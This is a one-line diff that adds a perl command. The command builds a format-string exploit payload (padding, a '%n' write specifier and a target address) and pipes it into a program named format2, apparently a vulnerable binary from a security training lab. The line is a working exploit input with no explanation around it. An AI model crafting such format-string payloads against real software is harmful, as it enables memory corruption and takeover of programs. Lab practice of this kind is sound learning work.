@@ -1,0 +1,1 @@
+perl -E 'say "a"x64 . "%22\$n" . "B"x3 . "\xe4\x96\x04\x08" . "A"x249' | ./format2
